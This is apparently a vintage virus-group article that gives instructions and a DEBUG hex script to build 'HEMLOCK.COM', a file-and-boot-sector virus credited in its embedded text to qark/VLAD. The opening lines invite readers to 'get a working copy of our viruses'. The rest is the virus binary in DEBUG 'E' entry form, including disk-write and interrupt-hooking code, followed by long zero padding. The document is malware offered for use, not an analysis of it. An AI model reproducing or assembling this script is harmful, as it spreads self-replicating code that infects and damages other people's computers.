
  Debug Scripts!
  +------------+

  To get a working copy of our viruses, cut this article up, and rename
  the various sections according to the name of the file they will create
  but adding the extension .SCR.
  
  From there, to create the viruses go:  DEBUG < filename.SCR

  
  For example:
   below should become 'hemlock.scr'
   debug < hemlock.scr

  Simple!

+-------------------- Cut Here --------------------------------------+

 N HEMLOCK.COM
 E 0100 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
 E 028F 5F 07 E8 87 03 73 03 E9 83 00 50 53 51 52 56 57 06 9C 2E A1 76
 E 02A4 01 E8 37 06 73 03 E9 67 00 03 C1 72 05 3D 18 00 76 09 2B C1 B9
 E 02B9 18 00 2B C8 EB 02 2B C1 26 FF 75 17 26 FF 75 15 26 FF 75 13 26
 E 02CE FF 75 11 26 81 45 11 6F 0C 26 83 55 13 00 26 FF 75 11 26 8F 45
 E 02E3 15 26 FF 75 13 26 8F 45 17 26 83 6D 15 18 26 83 5D 17 00 26 01
 E 02F8 45 15 26 83 55 17 00 B0 3F E8 15 03 26 8F 45 11 26 8F 45 13 26
 E 030D 8F 45 15 26 8F 45 17 9D 07 5F 5E 5A 59 5B 58 CA 02 00 58 5E E8
 E 0322 F6 00 E8 F4 02 72 2C 9C 93 E8 B9 06 93 72 23 06 57 93 E8 A8 05
 E 0337 93 72 18 E8 9C 05 72 13 2E 80 3E 51 0C 00 74 0B 26 81 6D 11 6F
 E 034C 0C 26 83 5D 13 00 5F 07 9D CA 02 00 58 5E 3D 00 4B 75 18 2E C6
 E 0361 06 51 0C 01 E8 9C 05 E8 AF 00 E8 AD 02 2E C6 06 51 0C 01 CA 02
 E 0376 00 E8 A0 00 E9 97 02 58 5E 2E 80 3E 51 0C 00 74 F3 3C 01 74 EF
 E 038B E8 8D 02 9C 72 08 80 FE C8 72 03 80 EE C8 9D CA 02 00 58 5E 2E
 E 03A0 80 3E 51 0C 00 74 D3 E8 71 02 3C 00 75 2D 06 50 53 B0 2F E8 63
 E 03B5 02 26 80 3F FF 75 03 83 C3 07 26 8A 47 1A 3C C8 72 11 2C C8 26
 E 03CA 88 47 1A 26 81 6F 1D 6F 0C 26 83 5F 1F 00 5B 58 07 CF E9 35 02
 E 03DF 58 5E 2E 80 3E 51 0C 00 74 F3 E8 2F 02 72 26 9C 06 53 56 B0 2F
 E 03F4 E8 22 02 26 8A 47 19 3C C8 72 11 2C C8 26 88 47 19 26 81 6F 1A
 E 0409 6F 0C 26 83 5F 1C 00 5E 5B 07 9D CA 02 00 E9 EE 01 50 53 51 52
 E 041E 56 57 1E 06 55 33 ED 80 FC 6C 75 02 89 F2 FC 1E 07 B0 2E 89 D7
 E 0433 B9 80 00 F2 AE 75 DD 2E C6 06 52 0C 00 89 FE AD 0D 20 20 3D 63
 E 0448 6F 75 0A AC 0C 20 3C 6D 75 C5 E9 21 00 3D 65 78 75 0A AC 0C 20
 E 045D 3C 65 75 B6 E9 12 00 3D 73 79 75 AE AC 0C 20 3C 73 75 A7 2E C6
 E 0472 06 52 0C 53 8D 46 3D E8 9D 01 72 99 93 E8 B8 06 E8 5A 04 72 76
 E 0487 E8 4F 04 77 71 26 C7 45 02 02 00 0E 07 8D 46 3F 0E 1F B9 1C 00
 E 049C BA 57 0C E8 77 01 BE 57 0C AD 2E 80 3E 52 0C 53 74 09 02 C4 3C
 E 04B1 A7 75 4C E9 96 00 40 75 43 AD 40 75 3F AD AD A3 10 01 E8 2F 04
 E 04C6 3D 60 EA 74 32 3D 00 04 72 2D E8 DF 03 A3 E2 00 50 B0 40 B9 6F
 E 04DB 0C 33 D2 E8 38 01 58 72 19 05 DB 00 A3 5D 0C E8 0D 04 B0 40 BA
 E 04F0 57 0C B9 18 00 E8 21 01 72 03 E8 CC 03 E9 00 01 C6 06 52 0C 43
 E 0505 E8 ED 03 0B D2 75 3E 3D 5C F3 77 39 3D 00 04 72 34 E8 99 03 50
 E 051A 05 00 01 A3 46 0C E8 53 06 B0 40 BA 6F 0C B9 6F 0C E8 EB 00 58
 E 052F 72 19 2D 03 00 A3 54 0C E8 C0 03 B0 40 BA 53 0C B9 03 00 E8 D4
 E 0544 00 72 03 E8 7F 03 E9 B3 00 C6 06 52 0C 45 4E 4E 83 7C 1A 00 75
 E 0559 F0 83 7C 18 40 73 EA E8 4F 03 FF 74 02 FF 74 04 FF 74 0C FF 74
 E 056E 0E FF 74 10 FF 74 14 FF 74 16 8B 44 0C 40 74 05 81 6C 0C C7 00
 E 0583 56 83 C6 14 BF D7 00 A5 A5 5E E8 65 03 52 50 B9 10 00 F7 F1 2B
 E 0598 44 08 89 16 46 0C 89 54 14 89 44 16 81 C2 57 10 89 44 0E 89 54
 E 05AD 10 58 5A 05 6F 0C 83 D2 00 B9 00 02 F7 F1 0B D2 74 01 40 89 44
 E 05C2 04 89 54 02 E8 31 03 89 F2 B9 18 00 B0 40 E8 46 00 8F 44 16 8F
 E 05D7 44 14 8F 44 10 8F 44 0E 8F 44 0C 8F 44 04 8F 44 02 72 16 E8 08
 E 05EC 03 E8 86 05 B0 40 BA 6F 0C B9 6F 0C E8 1E 00 72 03 E8 C9 02 B0
 E 0601 3E E8 14 00 E8 54 05 5D 07 1F 5F 5E 5A 59 5B 58 C3 58 5E EA 00
 E 0616 00 00 00 86 C4 9C 0E E8 F4 FF C3 33 C0 8E C0 BE 00 7C FA 8E D0
 E 062B 8B E6 FB 8E D8 83 2E 13 04 08 CD 12 B1 06 D3 E0 8E C0 33 C0 CD
 E 0640 13 32 F6 B9 04 00 0A D2 78 05 B9 04 00 B6 00 33 DB B8 07 02 CD
 E 0655 13 72 F7 26 C6 06 4F 0C 00 26 C6 06 50 0C 01 26 C6 06 48 0C 00
 E 066A BE 4C 00 FC BF 8A 06 A5 A5 C7 44 FC B8 05 8C 44 FE BE 24 00 BF
 E 067F A2 07 A5 A5 C7 44 FC 3B 07 8C 44 FE 33 F6 BF 42 19 B9 00 04 F3
 E 0694 A4 BE 49 04 A4 CD 19 45 75 CA 02 00 E9 EB 00 B9 03 00 B8 02 01
 E 06A9 0A D2 78 05 B9 0E 00 B6 01 E8 7E 01 E9 BD 00 E8 3E 03 86 C4 3C
 E 06BE 02 75 DF 83 F9 01 75 DA 0A F6 75 D6 E8 66 01 72 CE 9C 50 53 51
 E 06D3 52 56 57 1E 06 26 81 7F 7A 45 75 74 C3 B9 03 00 0A D2 78 3E 52
 E 06E8 0E 1F 26 8B 47 18 26 29 47 13 26 8B 47 13 26 8B 4F 18 33 D2 F7
 E 06FD F1 33 D2 26 8B 4F 1A F7 F1 50 86 C4 B1 06 D2 E0 0C 01 A3 4B 05
 E 0712 58 26 8B 4F 1A 33 D2 F7 F1 88 16 4E 05 B9 0E 00 5A B6 01 B8 03
 E 0727 01 E8 08 01 72 48 06 1F 89 DE 0E 07 B9 FE 01 FC BF 6F 0C F3 A4
 E 073C B8 55 AA AB BE 21 05 0E 1F BF 6F 0C B9 7C 00 F3 A4 33 C0 E8 E1
 E 0751 00 B8 03 01 32 F6 41 BB 6F 0C E8 D5 00 B9 04 00 0A D2 78 08 8B
 E 0766 0E 4B 05 8A 36 4E 05 33 DB B8 03 07 E8 BE 00 07 1F 5F 5E 5A 59
 E 077B 5B 58 9D E9 1C FF 3D EF BE 75 01 CF 86 C4 EA 00 00 00 00 2E 80
 E 0790 3E 4F 0C 01 75 02 EB E9 50 51 56 57 06 1E 2E 80 3E 48 0C 01 74
 E 07A5 28 89 DF B0 44 FC B9 00 02 F2 AE 74 02 EB 3C 0E 1F BE 49 0C 57
 E 07BA 51 B9 06 00 F3 A6 59 5F 75 EA C6 06 48 0C 01 C6 06 50 0C 0A FC
 E 07CF 3C 03 74 35 0B DB 74 05 3D EF BE 74 2C 89 DE 06 1F AC 3C 40 75
 E 07E4 0B AD 25 DF DF 3D 45 43 75 02 EB 18 06 1F 89 DE AD 3D 5A 4D 74
 E 07F9 05 3D 4D 5A 75 25 2E FE 0E 50 0C 74 02 EB 1C 0E 07 33 C0 8E D8
 E 080E BE 84 00 BF 15 05 A5 A5 C7 44 FC 12 01 8C 44 FE 2E C6 06 4F 0C
 E 0823 01 1F 07 5F 5E 59 58 3D EF BE 75 01 CF E9 4E FF 9C 0E E8 49 FF
 E 0838 86 C4 C3 50 1E 51 E4 60 3C 53 75 5A 33 C0 8E D8 A0 17 04 24 0C
 E 084D 3C 0C 75 4D B0 02 B1 21 D2 E8 A8 01 74 07 0F 01 E0 A8 01 75 3C
 E 0862 E4 61 50 0C 80 E6 61 58 E6 61 B0 20 E6 20 33 C0 2E A0 42 1D CD
 E 0877 10 1E 07 0E 1F B9 00 04 BE 42 19 33 FF FC FA F3 A4 FB 0E 1F C6
 E 088C 06 4F 0C 00 C6 06 50 0C 01 C6 06 48 0C 00 33 D2 CD 19 59 1F 58
 E 08A1 EA 00 00 00 00 EA 00 00 00 00 B0 03 CF 00 00 00 00 50 51 52 B8
 E 08B6 57 00 E8 5E FD 2E 89 0E CD 07 2E 89 16 CA 07 5A 59 58 C3 BA 00
 E 08CB 00 B9 00 00 80 C6 C8 B8 57 01 E8 41 FD C3 26 80 7D 10 C8 C3 53
 E 08E0 50 B8 20 12 CD 2F 72 0A 33 DB 26 8A 1D B8 16 12 CD 2F 58 5B C3
 E 08F5 B8 42 02 EB 03 B8 42 00 99 33 C9 E8 16 FD C3 50 53 51 52 56 57
 E 090A 1E 06 89 D6 AC 3C 2E 75 FB FD AD 33 C9 BF D9 08 0E 07 2E 8A 0D
 E 091F 4F 56 F3 A6 5E 74 0A 29 CF 81 FF AD 08 76 75 EB EC 81 FF AD 08
 E 0934 76 0E 81 FF B4 08 76 39 2E C6 06 51 0C 00 EB 5F FC 07 06 26 8B
 E 0949 7F 02 89 FE 26 8B 47 04 8E C0 8E D8 47 80 3C 00 74 0A B9 7F 00
 E 095E B0 0D F2 AE 75 3F 4F 80 04 06 0E 1F BE DA 08 B9 07 00 F3 A4 E9
 E 0973 2E 00 FC 07 06 26 8B 7F 02 89 FE 26 8B 47 04 8E C0 8E D8 47 80
 E 0988 3C 00 74 0A B9 7F 00 B0 0D F2 AE 75 0E 4F 80 04 05 0E 1F BE E1
 E 099D 08 B9 06 00 F3 A4 FC 07 1F 5F 5E 5A 59 5B 58 C3 54 42 53 43 41
 E 09B2 4E 06 57 49 4E 03 43 48 4B 44 53 4B 06 50 4B 5A 49 50 05 41 52
 E 09C7 4A 03 4E 44 44 03 53 43 41 4E 44 49 53 4B 08 4C 48 41 03 20 63
 E 09DC 6F 20 6E 6D 0D 20 2F 64 3A 66 0D 50 52 B8 44 00 E8 2A FC 72 04
 E 09F1 D0 E2 EB 01 F9 5A 58 C3 50 53 56 1E 33 C0 8E D8 C5 36 04 00 8A
 E 0A06 1C C6 04 CF 9C 58 80 E4 FE 50 9D 88 1C 1F 5E 5B 58 C3 50 53 51
 E 0A1B 52 06 0E 07 B8 01 02 8D 9C 6F 0C B9 01 00 BA 80 00 CD 13 26 81
 E 0A30 7F 7A 45 75 07 5A 59 5B 58 C3 50 56 57 1E 06 FC 89 F7 B8 00 F0
 E 0A45 8E D8 8B 36 0D FF AC 3C E9 74 08 BE 59 F8 AC 3C E9 75 27 4E 1E
 E 0A5A 0E 1F 33 C0 8E C0 26 FF 36 54 00 8F 85 A7 07 26 89 36 54 00 26
 E 0A6F FF 36 56 00 8F 85 A9 07 26 C7 06 56 00 00 F0 1F 33 F6 46 83 FE
 E 0A84 F0 73 2E 4E AD 3D 80 FA 75 F4 AD 3D 80 FB 75 EE AC 3C FC 75 E9
 E 0A99 83 EE 05 33 C0 8E D8 0E 07 8B C6 BE 4C 00 8D BD 8A 06 A5 A5 89
 E 0AAE 44 FC C7 44 FE 00 F0 07 1F 5F 5E 58 C3 50 53 51 52 1E 06 33 C0
 E 0AC3 BA 80 00 CD 13 8D 9C 6F 0C 0E 07 B8 01 02 B9 01 00 CD 13 B8 01
 E 0AD8 03 B1 03 CD 13 0E 1F 56 8D BC 6F 0C 81 C6 21 05 B9 7C 00 FC F3
 E 0AED A4 5E 8D BC 6D 0E B8 55 AA AB 8D 9C 6F 0C B9 01 00 B8 01 03 CD
 E 0B02 13 B9 04 00 B8 07 03 89 F3 CD 13 07 1F 5A 59 5B 58 C3 50 56 57
 E 0B17 1E 06 56 0E 1F 33 C0 8E C0 81 C6 A7 07 BF 54 00 FC A5 A5 5E 81
 E 0B2C C6 8A 06 BF 4C 00 A5 A5 07 1F 5F 5E 58 C3 50 56 57 1E 06 33 C0
 E 0B41 8E D8 0E 07 BE 90 00 BF AE 07 FC A5 A5 C7 44 FC AB 07 8C 4C FE
 E 0B56 07 1F 5F 5E 58 C3 50 56 57 1E 06 33 C0 8E C0 0E 1F BE AE 07 BF
 E 0B6B 90 00 FC A5 A5 07 1F 5F 5E 58 C3 50 53 51 52 56 57 1E 06 55 0E
 E 0B80 0E 1F 07 8B 2E 46 0C B9 3B 0C 33 FF E8 1F 00 33 F6 BF 6F 0C 8B
 E 0B95 CF F3 A4 A0 2C 0C BE 8A 0C B9 3A 0C E8 65 F5 5D 07 1F 5F 5E 5A
 E 0BAA 59 5B 58 C3 50 53 51 52 56 57 1E 06 FC 0E 1F E4 40 A2 2C 0C 33
 E 0BBF D2 80 FA 07 74 46 E4 40 24 03 3C 04 74 F3 FE C8 78 13 74 22 F6
 E 0BD4 C2 01 75 E8 80 CA 01 B0 B0 AA A0 2C 0C AA EB DC F6 C2 02 75 D7
 E 0BE9 80 CA 02 B0 B9 AA 89 C8 48 AB EB CB F6 C2 04 75 C6 80 CA 04 B0
 E 0BFE BE AA 89 E8 05 1B 00 AB B0 56 AA EB B5 33 D2 89 3E 2D 0C BE 08
 E 0C13 0C E4 40 25 06 00 01 C6 A5 80 FA 1F 74 5C BE FE 0B E4 40 25 0E
 E 0C28 00 3D 08 00 77 EE 01 C6 AD FF D0 EB E7 F6 C2 01 75 0B 80 CA 01
 E 0C3D B0 2E AA B8 30 04 AB C3 F6 C2 02 75 05 80 CA 02 EB 08 F6 C2 04
 E 0C52 75 11 80 CA 04 BE 10 0C E4 40 25 07 00 D1 E0 01 C6 A5 C3 F6 C2
 E 0C67 08 75 07 80 CA 08 B0 46 AA C3 F6 C2 10 75 BF 80 CA 10 B0 49 AA
 E 0C7C C3 33 D2 80 FA 03 74 54 E4 40 24 01 3C 00 74 37 F6 C2 01 75 32
 E 0C91 80 CA 01 BE 28 0C E4 40 25 01 00 01 C6 A4 B0 C9 AA BE 2A 0C E4
 E 0CA6 40 25 01 00 01 C6 A4 8B C7 40 2B 06 2D 0C 88 C4 E4 40 24 02 2A
 E 0CBB E0 88 E0 F6 D8 AA EB BC F6 C2 02 75 C4 80 CA 02 BE 20 0C E4 40
 E 0CD0 25 07 00 01 C6 A4 EB A7 BE 20 0C E4 40 25 07 00 01 C6 AC B4 C3
 E 0CE5 8B D0 E4 40 25 07 00 89 C1 86 D6 E2 FC 8B C2 AB 07 1F 5F 5E 5A
 E 0CFA 59 5B 58 C3 35 0B 45 0B 4F 0B 65 0B 71 0B 87 D3 B3 09 33 D2 2B
 E 0D0F DB D0 C8 04 7A 2C E0 FE C8 2C B2 FE C8 04 81 D0 C8 FC 4A 43 AE
 E 0D24 47 4F 42 4B 0B 23 79 7D 00 00 00 48 65 6D 6C 6F 63 6B 20 62 79
 E 0D39 20 5B 71 61 72 6B 2F 56 4C 41 44 5D 00 00 00 00 4F 53 44 41 54
 E 0D4E 41 00 01 01 43 E9 00 00 00 CD 20 00 00 00 00 00 00 00 00 00 00
 E 0D63 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 0D78 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 0D8D 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 0DA2 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 0DB7 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 0DCC 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 0DE1 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 0DF6 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 0E0B 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 0E20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 0E35 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 0E4A 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 0E5F 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 0E74 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 0E89 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 0E9E 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 0EB3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 0EC8 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 0EDD 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 0EF2 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 0F07 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 0F1C 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 0F31 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 0F46 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 0F5B 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 0F70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 0F85 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 0F9A 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 0FAF 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 0FC4 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 0FD9 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 0FEE 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1003 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1018 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 102D 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1042 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1057 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 106C 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1081 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1096 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 10AB 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 10C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 10D5 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 10EA 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 10FF 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1114 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1129 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 113E 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1153 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1168 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 117D 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1192 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 11A7 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 11BC 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 11D1 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 11E6 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 11FB 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1210 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1225 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 123A 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 124F 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1264 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1279 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 128E 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 12A3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 12B8 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 12CD 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 12E2 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 12F7 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 130C 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1321 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1336 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 134B 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1360 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1375 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 138A 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 139F 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 13B4 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 13C9 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 13DE 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 13F3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1408 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 141D 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1432 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1447 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 145C 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1471 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1486 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 149B 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 14B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 14C5 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 14DA 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 14EF 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1504 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1519 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 152E 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1543 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1558 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 156D 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1582 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1597 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
